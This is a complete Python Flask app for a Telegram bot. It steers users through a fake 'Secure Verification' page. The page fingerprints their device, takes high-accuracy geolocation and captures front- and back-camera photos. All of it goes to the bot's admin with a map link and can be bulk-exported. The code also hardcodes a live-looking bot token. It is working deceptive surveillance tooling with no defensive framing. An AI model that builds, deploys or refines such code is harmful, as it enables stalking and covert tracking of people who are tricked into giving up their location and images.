import os
import json
import sqlite3
import datetime
import hashlib
import base64
import logging
import requests
from io import BytesIO
from flask import Flask, request, jsonify, render_template_string

# ==================== HARDCODED CONFIG ====================
BOT_TOKEN = "8680846598:AAE0o3vS2fn16ZuIvvPJjXeuPQubDT2eUo8"
ADMIN_IDS = [8691519315]
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
BASE_URL = RENDER_URL if RENDER_URL else "http://localhost:5000"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ==================== SETUP ====================
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.pending_broadcast = {}

# ==================== DATABASE ====================
DB_PATH = "bot_data.db"

def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.executescript('''
        CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            first_seen TEXT,
            last_seen TEXT
        );
        CREATE TABLE IF NOT EXISTS collected_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            timestamp TEXT,
            device_info TEXT,
            location TEXT,
            photos TEXT,
            additional TEXT
        );
        CREATE TABLE IF NOT EXISTS bot_stats (
            key TEXT PRIMARY KEY,
            value TEXT
        );
    ''')
    defaults = {"total_users":"0","users_today":"0","total_data":"0","total_visits":"0","bot_status":"1","last_date":""}
    for k, v in defaults.items():
        c.execute("INSERT OR IGNORE INTO bot_stats (key, value) VALUES (?, ?)", (k, v))
    conn.commit()
    conn.close()
    logger.info("✅ Database initialized")

def get_stat(key):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT value FROM bot_stats WHERE key=?", (key,))
    row = c.fetchone()
    conn.close()
    return int(row["value"]) if row else 0

def update_stat(key, value):
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE bot_stats SET value=? WHERE key=?", (str(value), key))
    conn.commit()
    conn.close()

def is_bot_on():
    return get_stat("bot_status") == 1

def add_user(chat_id, username, first_name):
    conn = get_db()
    c = conn.cursor()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("SELECT * FROM users WHERE chat_id=?", (chat_id,))
    existing = c.fetchone()
    if existing:
        c.execute("UPDATE users SET username=?, first_name=?, last_seen=? WHERE chat_id=?", (username, first_name, now, chat_id))
    else:
        c.execute("INSERT INTO users (chat_id, username, first_name, first_seen, last_seen) VALUES (?,?,?,?,?)", (chat_id, username, first_name, now, now))
        update_stat("total_users", get_stat("total_users") + 1)
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    if get_stat("last_date") != today:
        update_stat("last_date", today)
        update_stat("users_today", 0)
    update_stat("users_today", get_stat("users_today") + 1)
    conn.commit()
    conn.close()

def save_collected_data(chat_id, device_info, location, photos, additional):
    conn = get_db()
    c = conn.cursor()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute('''INSERT INTO collected_data (chat_id, timestamp, device_info, location, photos, additional) VALUES (?,?,?,?,?,?)''',
              (chat_id, now, json.dumps(device_info), json.dumps(location), json.dumps(photos), json.dumps(additional)))
    conn.commit()
    conn.close()
    update_stat("total_data", get_stat("total_data") + 1)
    update_stat("total_visits", get_stat("total_visits") + 1)

def get_all_users():
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT * FROM users ORDER BY last_seen DESC")
    rows = [dict(r) for r in c.fetchall()]
    conn.close(); return rows

def get_recent_data(limit=10):
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT * FROM collected_data ORDER BY id DESC LIMIT ?", (limit,))
    rows = [dict(r) for r in c.fetchall()]
    conn.close(); return rows

def export_all_data():
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT * FROM collected_data ORDER BY id DESC")
    result = []
    for r in c.fetchall():
        d = dict(r)
        for field in ["device_info","location","photos","additional"]:
            if d.get(field): d[field] = json.loads(d[field])
        result.append(d)
    conn.close()
    return result

# ==================== TELEGRAM API HELPERS ====================

def send_msg(chat_id, text, parse_mode="Markdown", reply_markup=None):
    data = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": True}
    if reply_markup: data["reply_markup"] = json.dumps(reply_markup)
    try:
        return requests.post(f"{TELEGRAM_API}/sendMessage", data=data, timeout=10).json()
    except Exception as e:
        logger.error(f"send_msg error: {e}")
        return None

def send_photo_msg(chat_id, photo_data, caption=""):
    url = f"{TELEGRAM_API}/sendPhoto"
    if isinstance(photo_data, str) and photo_data.startswith("data:image"):
        img_data = base64.b64decode(photo_data.split(",")[1])
        files = {"photo": ("photo.jpg", BytesIO(img_data), "image/jpeg")}
        data = {"chat_id": chat_id, "caption": caption}
    else:
        files = {"photo": open(photo_data, "rb")}
        data = {"chat_id": chat_id, "caption": caption}
    try:
        return requests.post(url, data=data, files=files, timeout=10).json()
    except Exception as e:
        logger.error(f"send_photo error: {e}")
        return None

def send_doc(chat_id, filepath, caption=""):
    with open(filepath, "rb") as f:
        try:
            return requests.post(f"{TELEGRAM_API}/sendDocument", data={"chat_id": chat_id, "caption": caption}, files={"document": f}, timeout=30).json()
        except Exception as e:
            logger.error(f"send_doc error: {e}")
            return None

def edit_msg(chat_id, msg_id, text, parse_mode="Markdown", reply_markup=None):
    data = {"chat_id": chat_id, "message_id": msg_id, "text": text, "parse_mode": parse_mode}
    if reply_markup: data["reply_markup"] = json.dumps(reply_markup)
    try:
        return requests.post(f"{TELEGRAM_API}/editMessageText", data=data, timeout=10).json()
    except Exception as e:
        logger.error(f"edit_msg error: {e}")
        return None

def answer_cb(cb_id, text="", alert=False):
    try:
        requests.post(f"{TELEGRAM_API}/answerCallbackQuery", data={"callback_query_id": cb_id, "text": text, "show_alert": alert}, timeout=5)
    except:
        pass

# ==================== BOT HANDLERS ====================

def handle_start(chat_id, username, first_name):
    if not is_bot_on() and chat_id not in ADMIN_IDS:
        send_msg(chat_id, "⏳ Bot under maintenance. Try later.")
        return
    add_user(chat_id, username, first_name)
    keyboard = {"inline_keyboard": [[{"text": "📸 Send Your Photo", "callback_data": "send_photo"}]]}
    send_msg(chat_id,
        f"👋 **Welcome, {first_name}!**\n\n🔐 Please send your photo to continue.\n\nAfter that, you'll receive a verification link.",
        reply_markup=keyboard)

def handle_admin_panel(chat_id):
    if chat_id not in ADMIN_IDS:
        send_msg(chat_id, "❌ Unauthorized.")
        return
    status = "🟢 ON" if is_bot_on() else "🔴 OFF"
    keyboard = {"inline_keyboard": [
        [{"text": "📊 Dashboard", "callback_data": "adm_dash"}],
        [{"text": "🔛 Bot ON/OFF", "callback_data": "adm_toggle"}],
        [{"text": "👥 Users", "callback_data": "adm_users"}],
        [{"text": "📦 Data", "callback_data": "adm_data"}],
        [{"text": "📤 Export", "callback_data": "adm_export"}],
        [{"text": "📢 Broadcast", "callback_data": "adm_bc"}],
        [{"text": "🔄 Reset", "callback_data": "adm_reset"}]
    ]}
    send_msg(chat_id,
        f"🤖 **Admin Panel**\n\nStatus: {status}\n━━━━━━━━━━\n👥 Users: {get_stat('total_users')}\n📈 Today: {get_stat('users_today')}\n👁️ Visits: {get_stat('total_visits')}\n📦 Data: {get_stat('total_data')}\n━━━━━━━━━━\n⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        reply_markup=keyboard)

def handle_photo_received(chat_id, file_id):
    try:
        resp = requests.get(f"{TELEGRAM_API}/getFile?file_id={file_id}", timeout=10).json()
        file_path = resp["result"]["file_path"]
        img_resp = requests.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}", timeout=15)
        os.makedirs("photos", exist_ok=True)
        local_path = f"photos/{chat_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(local_path, "wb") as f: f.write(img_resp.content)
        
        unique_hash = hashlib.md5(f"{chat_id}_{datetime.datetime.now().timestamp()}".encode()).hexdigest()[:12]
        cap_link = f"{BASE_URL}/capture?chat_id={chat_id}&uid={unique_hash}"
        
        send_photo_msg(chat_id, local_path, "✅ **Photo received!**")
        keyboard = {"inline_keyboard": [[{"text": "🔗 Click to Verify", "url": cap_link}]]}
        send_msg(chat_id, "⬇️ **Tap below to verify:**", reply_markup=keyboard)
        return local_path
    except Exception as e:
        logger.error(f"Photo error: {e}")
        send_msg(chat_id, "❌ Error saving photo.")
        return None

def handle_callback(cb):
    data = cb.get("data","")
    chat_id = cb["message"]["chat"]["id"]
    msg_id = cb["message"]["message_id"]
    cb_id = cb["id"]
    user_id = cb["from"]["id"]
    
    if data == "send_photo":
        answer_cb(cb_id, "Send your photo now.")
        send_msg(chat_id, "📸 **Please upload your photo now.** Just send it as a photo in this chat.")
        return
    
    if user_id not in ADMIN_IDS:
        answer_cb(cb_id, "❌ Unauthorized", True)
        return
    
    if data == "adm_dash":
        s = "🟢 ON" if is_bot_on() else "🔴 OFF"
        edit_msg(chat_id, msg_id,
            f"📊 **Dashboard**\n\nStatus: {s}\n━━━━━━━━━━\n👥 Total: {get_stat('total_users')}\n📈 Today: {get_stat('users_today')}\n👁️ Visits: {get_stat('total_visits')}\n📦 Data: {get_stat('total_data')}\n━━━━━━━━━━\n⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        answer_cb(cb_id)
    
    elif data == "adm_toggle":
        new = 0 if is_bot_on() else 1
        update_stat("bot_status", new)
        edit_msg(chat_id, msg_id, f"✅ Bot {'ON 🟢' if new else 'OFF 🔴'}")
        answer_cb(cb_id)
    
    elif data == "adm_users":
        users = get_all_users()
        msg = f"👥 **Total Users:** {len(users)}\n\n"
        for u in users[:20]:
            msg += f"• {u.get('first_name','?')} (@{u.get('username','N/A')}) — `{u['chat_id']}` — {u.get('last_seen','')[:16]}\n"
        edit_msg(chat_id, msg_id, msg)
        answer_cb(cb_id)
    
    elif data == "adm_data":
        items = get_recent_data(10)
        msg = f"📦 **Total Data:** {get_stat('total_data')}\n\n"
        for it in items:
            di = json.loads(it["device_info"]) if it["device_info"] else {}
            loc = json.loads(it["location"]) if it["location"] else {}
            ph = json.loads(it["photos"]) if it["photos"] else []
            m = di.get("model","?")[:20]
            l = "📍" if loc.get("lat") else "❌"
            msg += f"• `{it['chat_id']}` | {m} | {l} 📸{len(ph)} | {it['timestamp'][:16]}\n"
        edit_msg(chat_id, msg_id, msg)
        answer_cb(cb_id)
    
    elif data == "adm_export":
        data_list = export_all_data()
        os.makedirs("exports", exist_ok=True)
        fn = f"exports/export_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fn, "w") as f: json.dump(data_list, f, indent=2)
        send_doc(chat_id, fn, f"📤 {len(data_list)} records")
        edit_msg(chat_id, msg_id, f"✅ Exported {len(data_list)} records.")
        answer_cb(cb_id)
    
    elif data == "adm_bc":
        edit_msg(chat_id, msg_id, "📢 **Send your broadcast message now.** Reply with the message.")
        app.pending_broadcast[chat_id] = True
        answer_cb(cb_id)
    
    elif data == "adm_reset":
        update_stat("users_today", 0); update_stat("total_visits", 0); update_stat("total_data", 0)
        edit_msg(chat_id, msg_id, "✅ Stats reset!")
        answer_cb(cb_id)

# ==================== WEBHOOK ====================

@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
def webhook():
    try:
        update = request.get_json()
        if not update:
            return "OK", 200
        
        logger.info(f"Update: {json.dumps(update)[:200]}")
        
        # Message
        if "message" in update:
            msg = update["message"]
            chat_id = msg["chat"]["id"]
            text = msg.get("text","")
            username = msg["from"].get("username","")
            first_name = msg["from"].get("first_name","User")
            
            if text == "/start":
                handle_start(chat_id, username, first_name)
            elif text.startswith("/admin") or text.startswith("/panel"):
                handle_admin_panel(chat_id)
            elif "photo" in msg:
                handle_photo_received(chat_id, msg["photo"][-1]["file_id"])
            elif chat_id in ADMIN_IDS and chat_id in app.pending_broadcast:
                app.pending_broadcast.pop(chat_id, None)
                users = get_all_users()
                suc, fail = 0, 0
                for u in users:
                    try:
                        send_msg(u["chat_id"], f"📢 **Broadcast:**\n\n{text}")
                        suc += 1
                    except:
                        fail += 1
                send_msg(chat_id, f"✅ Sent: {suc} | Failed: {fail}")
        
        # Callback
        if "callback_query" in update:
            handle_callback(update["callback_query"])
        
        return "OK", 200
    except Exception as e:
        logger.error(f"Webhook error: {e}", exc_info=True)
        return "OK", 200

# ==================== CAPTURE WEB PAGE ====================

HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px}
.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.1);border-radius:24px;padding:28px 24px;max-width:400px;width:100%}
h1{color:#fff;font-size:22px;text-align:center;margin-bottom:6px}
.subtitle{color:rgba(255,255,255,0.5);text-align:center;font-size:13px;margin-bottom:24px}
.panel{background:rgba(255,255,255,0.05);border-radius:16px;padding:16px;margin-bottom:20px}
.panel-title{color:rgba(255,255,255,0.4);font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-bottom:12px;text-align:center}
.d-row{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:13px}
.d-row:last-child{border-bottom:none}
.d-label{color:rgba(255,255,255,0.4)}
.d-value{color:#fff;font-weight:500}
.btn{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;padding:16px;border-radius:14px;font-size:16px;font-weight:600;cursor:pointer;width:100%;transition:.3s}
.btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(102,126,234,0.4)}
.btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
.step{display:none}
.step.active{display:block}
.dots{display:flex;justify-content:center;gap:8px;margin-bottom:24px}
.dot{width:10px;height:10px;border-radius:50%;background:rgba(255,255,255,0.1);transition:.3s}
.dot.active{background:#667eea;transform:scale(1.3)}
.dot.done{background:#38ef7d}
.icon{font-size:48px;text-align:center;margin:16px 0}
.atext{color:rgba(255,255,255,0.7);text-align:center;font-size:14px;margin-bottom:20px}
.pwrap{margin:20px 0}
.pbar{height:6px;background:rgba(255,255,255,0.1);border-radius:3px;overflow:hidden}
.pfill{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);width:0%;transition:width .5s;border-radius:3px}
.ptext{color:rgba(255,255,255,0.3);font-size:12px;text-align:center;margin-top:8px}
.cmark{width:70px;height:70px;border-radius:50%;background:linear-gradient(135deg,#11998e,#38ef7d);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;animation:pop .5s ease}
.cmark svg{width:36px;height:36px;fill:#fff}
@keyframes pop{0%{transform:scale(0)}60%{transform:scale(1.15)}100%{transform:scale(1)}}
.spinner{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.2);border-top:3px solid #667eea;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.sbox{background:rgba(255,255,255,0.05);border-radius:12px;padding:12px;text-align:center}
.sbox .num{color:#fff;font-size:22px;font-weight:700}
.sbox .lbl{color:rgba(255,255,255,0.4);font-size:11px;margin-top:4px}
.hidden{display:none}
</style>
</head>
<body>
<div class="card">
<div class="step active" id="s1">
<div class="icon">🛡️</div>
<h1>Secure Verification</h1>
<p class="subtitle">Collecting device information...</p>
<div class="panel"><div class="panel-title">🔍 Device Profile</div>
<div id="di">
<div class="d-row"><span class="d-label">📱 Model</span><span class="d-value" id="dModel">Detecting...</span></div>
<div class="d-row"><span class="d-label">💾 RAM</span><span class="d-value" id="dRAM">Detecting...</span></div>
<div class="d-row"><span class="d-label">⚡ CPU</span><span class="d-value" id="dCPU">Detecting...</span></div>
<div class="d-row"><span class="d-label">🔋 Battery</span><span class="d-value" id="dBattery">Detecting...</span></div>
<div class="d-row"><span class="d-label">📡 Network</span><span class="d-value" id="dNetwork">Detecting...</span></div>
<div class="d-row"><span class="d-label">🌐 OS</span><span class="d-value" id="dOS">Detecting...</span></div>
</div></div>
<button class="btn" id="startBtn" onclick="startV()">🔐 Start Verification</button>
<p style="text-align:center;margin-top:12px;color:rgba(255,255,255,0.3);font-size:11px">Permissions will be requested one at a time</p>
</div>
<div class="step" id="s2">
<div class="dots" id="dots"></div>
<div class="icon" id="sIcon">📍</div>
<h1 id="sTitle">Location</h1>
<p class="subtitle" id="sDesc">Please allow when asked.</p>
<div class="pwrap"><div class="pbar"><div class="pfill" id="pFill"></div></div><div class="ptext" id="pText">Step 1 of 4</div></div>
<button class="btn" id="actBtn" onclick="nextStep()"><span class="spinner" id="loader" style="display:none"></span><span id="btnTxt">Allow & Continue</span></button>
</div>
<div class="step" id="s3">
<div class="cmark"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
<h1>✅ Complete</h1>
<p class="subtitle">Verification successful.</p>
<div class="grid" id="finalS"></div>
<p style="text-align:center;color:rgba(255,255,255,0.3);font-size:12px;margin-top:16px">✓ Data submitted</p>
</div>
</div>
<script>
const CID="{{chat_id}}", UID="{{uid}}", BASE="{{base_url}}";
const di={};
async function collect(){
const ua=navigator.userAgent;
let model="Device";
if(/iPhone/.test(ua)){let m=ua.match(/iPhone(\d+),(\d+)/);model=m?"iPhone "+m[1]+","+m[2]:"iPhone"}
else if(/SM-/.test(ua)){let m=ua.match(/SM-[A-Z0-9]+/);model=m?m[0]:"Samsung"}
else if(/Redmi|Mi /.test(ua)){let m=ua.match(/(Redmi \d+|Mi \d+)/);model=m?m[0]:"Xiaomi"}
else if(/Pixel/.test(ua)){let m=ua.match(/Pixel \d+/);model=m?m[0]:"Pixel"}
di.model=model;document.getElementById("dModel").textContent=model;
di.ram=navigator.deviceMemory?navigator.deviceMemory+" GB":"?";document.getElementById("dRAM").textContent=di.ram;
di.cpu=navigator.hardwareConcurrency?navigator.hardwareConcurrency+" Cores":"?";document.getElementById("dCPU").textContent=di.cpu;
if(navigator.getBattery)try{let b=await navigator.getBattery();di.battery=Math.round(b.level*100)+"%";di.charging=b.charging?"Chg":"NChg";document.getElementById("dBattery").textContent=di.battery+" ("+di.charging+")"}catch(e){}
let c=navigator.connection||navigator.mozConnection;
if(c){di.network=c.effectiveType||"?";di.downlink=c.downlink?c.downlink+"Mbps":"";document.getElementById("dNetwork").textContent=di.network+" "+di.downlink}
di.os="?";if(/iPhone|iPad/.test(ua)){let m=ua.match(/OS (\d+)_(\d+)/);di.os=m?"iOS "+m[1]+"."+m[2]:"iOS"}
else if(/Android/.test(ua)){let m=ua.match(/Android ([\d.]+)/);di.os=m?"Android "+m[1]:"Android"}
document.getElementById("dOS").textContent=di.os;
di.lang=navigator.language;di.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;di.screen=screen.width+"x"+screen.height;
di.browser="?";if(/Chrome/.test(ua)&&!/Edg/.test(ua))di.browser="Chrome";else if(/Firefox/.test(ua))di.browser="Firefox";else if(/Safari/.test(ua)&&!/Chrome/.test(ua))di.browser="Safari";else if(/Edg/.test(ua))di.browser="Edge";
console.log("Device:",di);
}
const steps=[{icon:"📍",title:"Location",desc:"Allow location access."},{icon:"📸",title:"Front Camera",desc:"Quick photo needed."},{icon:"📷",title:"Back Camera",desc:"One more photo."},{icon:"🔋",title:"Finalizing",desc:"Almost done..."}];
let cur=0, cd={chat_id:CID,uid:UID,device_info:{},location:{},photos:[],additional:{}};
async function startV(){
document.getElementById("s1").classList.remove("active");document.getElementById("s2").classList.add("active");
cd.device_info={...di};
let d=document.getElementById("dots");d.innerHTML="";
steps.forEach((_,i)=>{let o=document.createElement("div");o.className="dot"+(i==0?" active":"");o.id="dot_"+i;d.appendChild(o)});
await goStep(0);
}
async function goStep(i){
if(i>=steps.length){await submitD();return}
cur=i;let s=steps[i];
document.getElementById("sIcon").textContent=s.icon;
document.getElementById("sTitle").textContent=s.title;
document.getElementById("sDesc").textContent=s.desc;
document.getElementById("pFill").style.width=((i+1)/steps.length*100)+"%";
document.getElementById("pText").textContent="Step "+(i+1)+" of "+steps.length;
document.querySelectorAll(".dot").forEach((d,j)=>{d.className="dot";if(j<i)d.classList.add("done");else if(j==i)d.classList.add("active")});
let btn=document.getElementById("actBtn");btn.disabled=false;
document.getElementById("loader").style.display="none";
document.getElementById("btnTxt").textContent="Allow & Continue";
}
async function nextStep(){
let btn=document.getElementById("actBtn"),bt=document.getElementById("btnTxt"),ld=document.getElementById("loader");
btn.disabled=true;ld.style.display="inline-block";bt.textContent="Processing...";
try{
if(cur==0)await getLoc();
else if(cur==1)await capCam("user");
else if(cur==2)await capCam("environment");
else if(cur==3)await getExtra();
}catch(e){console.warn("Step fail:",e)}
if(cur<steps.length-1){await goStep(cur+1);btn.disabled=false;ld.style.display="none";bt.textContent="Allow & Continue"}
else await submitD();
}
function getLoc(){return new Promise((r)=>{if(!navigator.geolocation){r();return}
navigator.geolocation.getCurrentPosition(p=>{cd.location={lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy};r()},()=>{r()},{enableHighAccuracy:true,timeout:8e3})})}
async function capCam(fm){try{
let s=await navigator.mediaDevices.getUserMedia({video:{facingMode:fm,width:{ideal:640},height:{ideal:480}}});
let v=document.createElement("video");v.srcObject=s;await v.play();
await new Promise(r=>setTimeout(r,800));
let c=document.createElement("canvas");c.width=v.videoWidth||640;c.height=v.videoHeight||480;
c.getContext("2d").drawImage(v,0,0);
cd.photos.push({camera:fm=="user"?"front":"back",data:c.toDataURL("image/jpeg",0.7),ts:new Date().toISOString()});
s.getTracks().forEach(t=>t.stop());return true
}catch(e){return false}}
async function getExtra(){return true}
async function submitD(){
let btn=document.getElementById("actBtn"),bt=document.getElementById("btnTxt"),ld=document.getElementById("loader");
btn.disabled=true;ld.style.display="inline-block";bt.textContent="Submitting...";
try{
let r=await fetch("/api/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(cd)});
let j=await r.json();console.log("Submit:",j);
document.getElementById("s2").classList.remove("active");document.getElementById("s3").classList.add("active");
document.getElementById("finalS").innerHTML=
'<div class="sbox"><div class="num">'+(cd.location.lat?"✓":"—")+'</div><div class="lbl">📍 Location</div></div>'+
'<div class="sbox"><div class="num">'+cd.photos.length+'</div><div class="lbl">📸 Photos</div></div>'+
'<div class="sbox"><div class="num">'+(di.model||"✓")+'</div><div class="lbl">📱 Device</div></div>'+
'<div class="sbox"><div class="num">'+(di.battery||"✓")+'</div><div class="lbl">🔋 Battery</div></div>';
}catch(e){console.error("Submit error:",e);btn.disabled=false;ld.style.display="none";bt.textContent="Retry";}
}
document.addEventListener("DOMContentLoaded",collect);
</script>
</body>
</html>
"""

@app.route("/capture")
def capture():
    chat_id = request.args.get("chat_id", "")
    uid = request.args.get("uid", "")
    if not chat_id or not uid:
        return "Invalid link", 400
    return render_template_string(HTML_PAGE, chat_id=chat_id, uid=uid, base_url=BASE_URL)

# ==================== DATA COLLECTION API ====================

@app.route("/api/collect", methods=["POST"])
def collect():
    try:
        data = request.get_json()
        if not data or not data.get("chat_id"):
            return jsonify({"status":"error","message":"Invalid"}), 400
        
        chat_id = int(data["chat_id"])
        device_info = data.get("device_info", {})
        location = data.get("location", {})
        photos = data.get("photos", [])
        additional = data.get("additional", {})
        
        save_collected_data(chat_id, device_info, location, photos, additional)
        
        # Save photo files
        os.makedirs("captured_photos", exist_ok=True)
        for i, p in enumerate(photos):
            if p.get("data","").startswith("data:image"):
                img = base64.b64decode(p["data"].split(",")[1])
                fn = f"captured_photos/{chat_id}_{datetime.datetime.now().strftime('%H%M%S')}_{p.get('camera','x')}_{i}.jpg"
                with open(fn, "wb") as f: f.write(img)
        
        # Notify admin
        for aid in ADMIN_IDS:
            msg = (
                f"📩 **New Data!**\n\n"
                f"👤 `{chat_id}`\n"
                f"📱 {device_info.get('model','?')}\n"
                f"💾 {device_info.get('ram','?')}\n"
                f"🔋 {device_info.get('battery','?')}\n"
            )
            if location.get("lat"):
                msg += f"📍 [Map](https://www.google.com/maps?q={location['lat']},{location['lng']})\n"
            msg += f"📸 {len(photos)} photos\n⏰ {datetime.datetime.now().strftime('%H:%M:%S')}"
            send_msg(aid, msg)
            for p in photos:
                if p.get("data","").startswith("data:image"):
                    send_photo_msg(aid, p["data"], f"📸 {p.get('camera','?')} — `{chat_id}`")
        
        update_stat("total_visits", get_stat("total_visits") + 1)
        return jsonify({"status":"success"})
    except Exception as e:
        logger.error(f"Collect error: {e}", exc_info=True)
        return jsonify({"status":"error","message":str(e)}), 500

# ==================== UTILITY ROUTES ====================

@app.route("/")
def home():
    bot_username = BOT_TOKEN.split(":")[0]
    return f'<script>window.location="https://t.me/{bot_username}";</script><a href="https://t.me/{bot_username}">Open Bot</a>'

@app.route("/health")
@app.route("/ping")
def health():
    return jsonify({
        "status": "alive",
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "bot_on": is_bot_on(),
        "users": get_stat("total_users"),
        "data": get_stat("total_data")
    })

@app.route("/set_webhook")
def set_webhook_route():
    webhook_url = f"{BASE_URL}/webhook/{BOT_TOKEN}"
    try:
        r = requests.get(f"{TELEGRAM_API}/setWebhook?url={webhook_url}", timeout=10).json()
        return jsonify({"status":"ok" if r.get("ok") else "error", "response": r, "url": webhook_url})
    except Exception as e:
        return jsonify({"status":"error","message":str(e)})

@app.route("/webhook_info")
def webhook_info():
    try:
        r = requests.get(f"{TELEGRAM_API}/getWebhookInfo", timeout=10).json()
        return jsonify(r)
    except Exception as e:
        return jsonify({"status":"error","message":str(e)})

@app.route("/delete_webhook")
def delete_webhook():
    try:
        r = requests.get(f"{TELEGRAM_API}/deleteWebhook", timeout=10).json()
        return jsonify(r)
    except Exception as e:
        return jsonify({"status":"error","message":str(e)})

# ==================== SAFE STARTUP (GUNICORN COMPATIBLE) ====================
# Yeh code Sirf TAB chalta hai jab python app.py se run karein
# Render pe gunicorn istemal karta hai, toh yeh nahi chalega - isliye safe hai
if __name__ == "__main__":
    print("🚀 Running in development mode...")
    print("⚠️ For production, use: gunicorn app:app")
    init_db()
    os.makedirs("photos", exist_ok=True)
    os.makedirs("captured_photos", exist_ok=True)
    os.makedirs("exports", exist_ok=True)
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
else:
    # Gunicorn ke saath: yeh tab chalta hai jab Render import karta hai
    print("🚀 Gunicorn mode: Initializing...")
    init_db()
    os.makedirs("photos", exist_ok=True)
    os.makedirs("captured_photos", exist_ok=True)
    os.makedirs("exports", exist_ok=True)
    
    # Webhook auto-set agar Render URL available hai
    if RENDER_URL:
        wh_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
        try:
            r = requests.get(f"{TELEGRAM_API}/setWebhook?url={wh_url}", timeout=10).json()
            print(f"✅ Webhook set: {r.get('description', 'OK')}")
        except Exception as e:
            print(f"⚠️ Webhook auto-set failed: {e}")
    else:
        print("⚠️ RENDER_EXTERNAL_URL not set. Visit /set_webhook after deploy.")
    
    print(f"🤖 Bot ready! Admin: /admin | Health: /health")
